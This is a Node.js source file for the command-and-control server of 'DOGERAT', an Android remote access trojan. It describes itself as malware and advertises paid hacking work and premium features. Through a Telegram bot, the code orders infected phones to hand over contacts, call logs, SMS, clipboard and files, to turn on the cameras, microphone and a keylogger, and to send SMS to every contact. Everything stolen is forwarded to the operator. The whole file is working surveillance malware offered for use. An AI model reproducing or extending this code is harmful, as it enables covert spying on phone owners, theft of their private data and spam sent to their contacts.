const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new TelegramBot(config.token, { polling: true, request: {} });
const appData = new Map();

// Define available actions for devices
const actions = [
  '✯ Contacts ✯', '✯ Calls ✯', '✯ Main camera ✯', '✯ Selfie Camera ✯',
  '✯ Screenshot ✯', '✯ Apps ✯', '✯ File explorer ✯', '✯ SMS ✯',
  '✯ Clipboard ✯', '✯ Keylogger ON ✯', '✯ Keylogger OFF ✯', '✯ Vibrate ✯',
  '✯ Microphone ✯', '✯ Toast ✯', '✯ Pop notification ✯', '✯ Open URL ✯',
  '✯ Encrypt ✯', '✯ Decrypt ✯', '✯ Send SMS to all contacts ✯', '✯ Phishing ✯',
  '✯ Play audio ✯', '✯ Stop Audio ✯', '✯ Cancel action ✯'
];

/**
 * Sends a Telegram message with consistent formatting
 * @param {string} chatId - Telegram chat ID
 * @param {string} message - Message text
 * @param {object} [options] - Additional options (e.g., reply_markup)
 */
const sendTelegramMessage = (chatId, message, options = {}) => {
  bot.sendMessage(chatId, message, {
    parse_mode: 'HTML',
    ...options
  });
};

/**
 * Sends a Telegram document with caption
 * @param {string} chatId - Telegram chat ID
 * @param {Buffer} file - File buffer
 * @param {string} caption - Document caption
 * @param {string} filename - File name
 * @param {string} contentType - File content type
 */
const sendTelegramDocument = (chatId, file, caption, filename, contentType) => {
  bot.sendDocument(chatId, file, { caption, parse_mode: 'HTML' }, { filename, contentType });
};

/**
 * Handles socket commands for single or all devices
 * @param {string} target - Target device ID or 'all'
 * @param {string} request - Command request
 * @param {Array} extras - Additional parameters
 */
const emitSocketCommand = (target, request, extras = []) => {
  const command = { request, extras };
  if (target === 'all') {
    io.sockets.emit('commend', command);
  } else {
    io.to(target).emit('commend', command);
  }
};

// File upload endpoint
app.post('/upload', uploader.single('file'), (req, res) => {
  try {
    const { originalname: filename } = req.file;
    const model = req.headers.model || 'no information';
    sendTelegramDocument(
      config.id,
      req.file.buffer,
      `<b>✯ File received from → ${model}</b>`,
      filename,
      '*/*'
    );
    res.send('Done');
  } catch (error) {
    console.error('Upload error:', error);
    res.status(500).send('Upload failed');
  }
});

// Text endpoint
app.get('/text', (req, res) => {
  res.send(config.token);
});

// Socket connection handler
io.on('connection', (socket) => {
  const deviceId = `${socket.handshake.headers.model || 'no information'}-${io.sockets.sockets.size}`;
  const model = socket.handshake.headers.model || 'no information';
  const ip = socket.handshake.headers.ip || 'no information';
  socket.model = model;
  socket.deviceId = deviceId;

  sendTelegramMessage(config.id, `
    <b>✯ New device connected</b>
    <b>Device ${deviceId}</b>
    <b>model</b> → ${model}
    <b>ip</b> → ${ip}
    <b>time</b> → ${socket.handshake.time}
  `);

  socket.on('disconnect', () => {
    sendTelegramMessage(config.id, `
      <b>✯ Device disconnected</b>
      <b>Device ${deviceId}</b>
      <b>model</b> → ${model}
      <b>ip</b> → ${ip}
      <b>time</b> → ${socket.handshake.time}
    `);
  });

  socket.on('message', (msg) => {
    sendTelegramMessage(config.id, `<b>✯ Message received from → ${deviceId}</b>\n\nMessage → ${msg}`);
  });
});

// Telegram bot message handler
bot.on('message', (msg) => {
  const chatId = config.id;
  const text = msg.text;

  if (text === '/start') {
    sendTelegramMessage(chatId, `
      <b>✯ Welcome to DOGERAT</b>
      DOGERAT is a malware to control Android devices
      Any misuse is the responsibility of the person!
      Developed by: @CYBERSHIELDX
    `, {
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
        resize_keyboard: true
      }
    });
    return;
  }

  // Handle specific appData states
  if (appData.get('currentAction') === 'microphoneDuration') {
    const duration = text;
    const target = appData.get('currentTarget');
    emitSocketCommand(target, 'microphone', [{ key: 'duration', value: duration }]);
    appData.delete('currentAction');
    appData.delete('currentTarget');
    sendTelegramMessage(chatId, `
      <b>✯ The request was executed successfully, you will receive device response soon ...</b>
      ✯ Return to main menu
    `, {
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
        resize_keyboard: true
      }
    });
    return;
  }

  if (appData.get('currentAction') === 'smsNumber') {
    const number = text;
    appData.set('currentNumber', number);
    appData.set('currentAction', 'smsText');
    sendTelegramMessage(chatId, `
      <b>✯ Now Enter a message that you want to send to ${number}</b>
    `, {
      reply_markup: {
        keyboard: [['✯ Cancel action ✯']],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    });
    return;
  }

  if (appData.get('currentAction') === 'smsText') {
    const message = text;
    const target = appData.get('currentTarget');
    const number = appData.get('currentNumber');
    emitSocketCommand(target, 'sendSms', [
      { key: 'number', value: number },
      { key: 'text', value: message }
    ]);
    appData.delete('currentTarget');
    appData.delete('currentAction');
    appData.delete('currentNumber');
    sendTelegramMessage(chatId, `
      <b>✯ The request was executed successfully, you will receive device response soon ...</b>
      ✯ Return to main menu
    `, {
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
        resize_keyboard: true
      }
    });
    return;
  }

  if (appData.get('currentAction') === 'textToAllContacts') {
    const message = text;
    const target = appData.get('currentTarget');
    emitSocketCommand(target, 'smsToAllContacts', [{ key: 'text', value: message }]);
    appData.delete('currentTarget');
    appData.delete('currentAction');
    sendTelegramMessage(chatId, `
      <b>✯ The request was executed successfully, you will receive device response soon ...</b>
      ✯ Return to main menu
    `, {
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
        resize_keyboard: true
      }
    });
    return;
  }

  if (appData.get('currentAction') === 'toastText') {
    const toast = text;
    const target = appData.get('currentTarget');
    emitSocketCommand(target, 'toast', [{ key: 'toastText', value: toast }]);
    appData.delete('currentTarget');
    appData.delete('currentAction');
    sendTelegramMessage(chatId, `
      <b>✯ The request was executed successfully, you will receive device response soon ...</b>
      ✯ Return to main menu
    `, {
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
        resize_keyboard: true
      }
    });
    return;
  }

  if (appData.get('currentAction') === 'notificationText') {
    const notification = text;
    const target = appData.get('currentTarget');
    emitSocketCommand(target, 'popNotification', [{ key: 'notificationText', value: notification }]);
    appData.delete('currentTarget');
    appData.delete('currentAction');
    sendTelegramMessage(chatId, `
      <b>✯ The request was executed successfully, you will receive device response soon ...</b>
      ✯ Return to main menu
    `, {
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
        resize_keyboard: true
      }
    });
    return;
  }

  if (appData.get('currentAction') === 'vibrateDuration') {
    const duration = text;
    const target = appData.get('currentTarget');
    emitSocketCommand(target, 'vibrate', [{ key: 'duration', value: duration }]);
    appData.delete('currentTarget');
    appData.delete('currentAction');
    sendTelegramMessage(chatId, `
      <b>✯ The request was executed successfully, you will receive device response soon ...</b>
      ✯ Return to main menu
    `, {
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
        resize_keyboard: true
      }
    });
    return;
  }

  // Handle main menu options
  if (text === '✯ Devices ✯') {
    if (io.sockets.sockets.size === 0) {
      sendTelegramMessage(chatId, '<b>✯ There is no connected device</b>');
      return;
    }
    let message = `<b>✯ Connected devices count : ${io.sockets.sockets.size}</b>`;
    let index = 1;
    io.sockets.sockets.forEach((socket) => {
      message += `
        <b>Device ${index}</b>
        <b>Device ${socket.deviceId}</b>
        <b>model</b> → ${socket.model}
        <b>ip</b> → ${socket.ip}
        <b>time</b> → ${socket.handshake.time}
      `;
      index++;
    });
    sendTelegramMessage(chatId, message);
    return;
  }

  if (text === '✯ About us ✯') {
    sendTelegramMessage(chatId, `
      <b>✯ If you want to hire us for any paid work please contact @sphanter
      We hack, We leak, We make malware
      Telegram → @CUBERSHIELDX
      ADMIN → @SPHANTER</b>
    `, {
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
        resize_keyboard: true
      }
    });
    return;
  }

  if (text === '✯ Back to main menu ✯') {
    sendTelegramMessage(chatId, '<b>✯ Main menu</b>', {
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
        resize_keyboard: true
      }
    });
    return;
  }

  if (text === '✯ Cancel action ✯') {
    const target = appData.get('currentTarget');
    sendTelegramMessage(chatId, `<b>✯ Select action to perform for ${target}</b>`, {
      reply_markup: {
        keyboard: [
          ['✯ Contacts ✯', '✯ Calls ✯'], ['✯ Main camera ✯', '✯ Selfie Camera ✯'],
          ['✯ Screenshot ✯', '✯ Apps ✯'], ['✯ File explorer ✯', '✯ SMS ✯'],
          ['✯ Clipboard ✯', '✯ Keylogger ON ✯'], ['✯ Keylogger OFF ✯', '✯ Vibrate ✯'],
          ['✯ Microphone ✯', '✯ Toast ✯'], ['✯ Pop notification ✯', '✯ Open URL ✯'],
          ['✯ Encrypt ✯', '✯ Decrypt ✯'], ['✯ Send SMS to all contacts ✯', '✯ Phishing ✯'],
          ['✯ Play audio ✯', '✯ Stop Audio ✯'], ['✯ Cancel action ✯']
        ],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    });
    return;
  }

  if (actions.includes(text)) {
    const target = appData.get('currentTarget');
    if (text === '✯ Contacts ✯') {
      emitSocketCommand(target, 'contacts');
      appData.delete('currentTarget');
      sendTelegramMessage(chatId, `
        <b>✯ The request was executed successfully, you will receive device response soon ...</b>
        ✯ Return to main menu
      `, {
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Calls ✯') {
      emitSocketCommand(target, 'calls');
      appData.delete('currentTarget');
      sendTelegramMessage(chatId, `
        <b>✯ The request was executed successfully, you will receive device response soon ...</b>
        ✯ Return to main menu
      `, {
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Main camera ✯') {
      emitSocketCommand(target, 'main-camera');
      appData.delete('currentTarget');
      sendTelegramMessage(chatId, `
        <b>✯ The request was executed successfully, you will receive device response soon ...</b>
        ✯ Return to main menu
      `, {
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Selfie Camera ✯') {
      emitSocketCommand(target, 'selfie-camera');
      appData.delete('currentTarget');
      sendTelegramMessage(chatId, `
        <b>✯ The request was executed successfully, you will receive device response soon ...</b>
        ✯ Return to main menu
      `, {
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Screenshot ✯') {
      emitSocketCommand(target, 'screenshot');
      appData.delete('currentTarget');
      sendTelegramMessage(chatId, `
        <b>✯ The request was executed successfully, you will receive device response soon ...</b>
        ✯ Return to main menu
      `, {
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Apps ✯') {
      emitSocketCommand(target, 'apps');
      appData.delete('currentTarget');
      sendTelegramMessage(chatId, `
        <b>✯ The request was executed successfully, you will receive device response soon ...</b>
        ✯ Return to main menu
      `, {
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ File explorer ✯') {
      emitSocketCommand(target, 'file');
      appData.delete('currentTarget');
      sendTelegramMessage(chatId, `
        <b>✯ The request was executed successfully, you will receive device response soon ...</b>
        ✯ Return to main menu
      `, {
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ SMS ✯') {
      appData.set('currentAction', 'smsNumber');
      sendTelegramMessage(chatId, '<b>✯ Enter a phone number that you want to send SMS</b>', {
        reply_markup: {
          keyboard: [['✯ Cancel action ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ Clipboard ✯') {
      emitSocketCommand(target, 'clipboard');
      appData.delete('currentTarget');
      sendTelegramMessage(chatId, `
        <b>✯ The request was executed successfully, you will receive device response soon ...</b>
        ✯ Return to main menu
      `, {
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Keylogger ON ✯') {
      emitSocketCommand(target, 'keylogger-on');
      appData.delete('currentTarget');
      sendTelegramMessage(chatId, `
        <b>✯ The request was executed successfully, you will receive device response soon ...</b>
        ✯ Return to main menu
      `, {
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Keylogger OFF ✯') {
      emitSocketCommand(target, 'keylogger-off');
      appData.delete('currentTarget');
      sendTelegramMessage(chatId, `
        <b>✯ The request was executed successfully, you will receive device response soon ...</b>
        ✯ Return to main menu
      `, {
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Vibrate ✯') {
      appData.set('currentAction', 'vibrateDuration');
      sendTelegramMessage(chatId, '<b>✯ Enter the duration you want the device to vibrate in seconds</b>', {
        reply_markup: {
          keyboard: [['✯ Cancel action ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ Microphone ✯') {
      appData.set('currentAction', 'microphoneDuration');
      sendTelegramMessage(chatId, '<b>✯ Enter the microphone recording duration in seconds</b>', {
        reply_markup: {
          keyboard: [['✯ Cancel action ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ Toast ✯') {
      appData.set('currentAction', 'toastText');
      sendTelegramMessage(chatId, '<b>✯ Enter a message that you want to appear in toast box</b>', {
        reply_markup: {
          keyboard: [['✯ Cancel action ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ Pop notification ✯') {
      appData.set('currentAction', 'notificationText');
      sendTelegramMessage(chatId, '<b>✯ Enter text that you want to appear as notification</b>', {
        reply_markup: {
          keyboard: [['✯ Cancel action ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ Open URL ✯') {
      appData.set('currentAction', 'url');
      sendTelegramMessage(chatId, '<b>✯ Enter the URL you want to open</b>', {
        reply_markup: {
          keyboard: [['✯ Cancel action ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ Encrypt ✯' || text === '✯ Decrypt ✯') {
      sendTelegramMessage(chatId, '<b>✯ This option is only available on premium version dm to buy @sphanter</b>', {
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Send SMS to all contacts ✯') {
      appData.set('currentAction', 'textToAllContacts');
      sendTelegramMessage(chatId, '<b>✯ Enter text that you want to send to all target contacts</b>', {
        reply_markup: {
          keyboard: [['✯ Cancel action ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ Phishing ✯' || text === '✯ Play audio ✯' || text === '✯ Stop Audio ✯') {
      sendTelegramMessage(chatId, '<b>✯ This option is only available on premium version dm to buy @sphanter</b>', {
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ About us ✯'], ['✯ Back to main menu ✯']],
          resize_keyboard: true
        }
      });
    }
    return;
  }

  // Handle device selection
  io.sockets.sockets.forEach((socket, id) => {
    if (text === socket.deviceId) {
      appData.set('currentTarget', id);
      sendTelegramMessage(chatId, `<b>✯ Select action to perform for ${socket.deviceId}</b>`, {
        reply_markup: {
          keyboard: [
            ['✯ Contacts ✯', '✯ Calls ✯'], ['✯ Main camera ✯', '✯ Selfie Camera ✯'],
            ['✯ Screenshot ✯', '✯ Apps ✯'], ['✯ File explorer ✯', '✯ SMS ✯'],
            ['✯ Clipboard ✯', '✯ Keylogger ON ✯'], ['✯ Keylogger OFF ✯', '✯ Vibrate ✯'],
            ['✯ Microphone ✯', '✯ Toast ✯'], ['✯ Pop notification ✯', '✯ Open URL ✯'],
            ['✯ Encrypt ✯', '✯ Decrypt ✯'], ['✯ Send SMS to all contacts ✯', '✯ Phishing ✯'],
            ['✯ Play audio ✯', '✯ Stop Audio ✯'], ['✯ Cancel action ✯']
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  });

  if (text === '✯ All ✯') {
    appData.set('currentTarget', 'all');
    sendTelegramMessage(chatId, '<b>✯ Select action to perform for all available devices</b>', {
      reply_markup: {
        keyboard: [
          ['✯ Contacts ✯', '✯ Calls ✯'], ['✯ Main camera ✯', '✯ Selfie Camera ✯'],
          ['✯ Screenshot ✯', '✯ Apps ✯'], ['✯ File explorer ✯', '✯ SMS ✯'],
          ['✯ Clipboard ✯', '✯ Keylogger ON ✯'], ['✯ Keylogger OFF ✯', '✯ Vibrate ✯'],
          ['✯ Microphone ✯', '✯ Toast ✯'], ['✯ Pop notification ✯', '✯ Open URL ✯'],
          ['✯ Encrypt ✯', '✯ Decrypt ✯'], ['✯ Send SMS to all contacts ✯', '✯ Phishing ✯'],
          ['✯ Play audio ✯', '✯ Stop Audio ✯'], ['✯ Cancel action ✯']
        ],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    });
  }
});

// Periodic ping to keep connections alive
setInterval(() => {
  io.sockets.sockets.forEach((socket, id) => {
    io.to(id).emit('ping', {});
  });
}, 5000);

// Periodic HTTPS request to keep the server alive
setInterval(() => {
  https.get(config.url, (res) => {}).on('error', (err) => {});
}, 300000);

// Start the server
const port = process.env.PORT || 3000;
server.listen(port, () => {
  console.log(`listening on port ${port}`);
});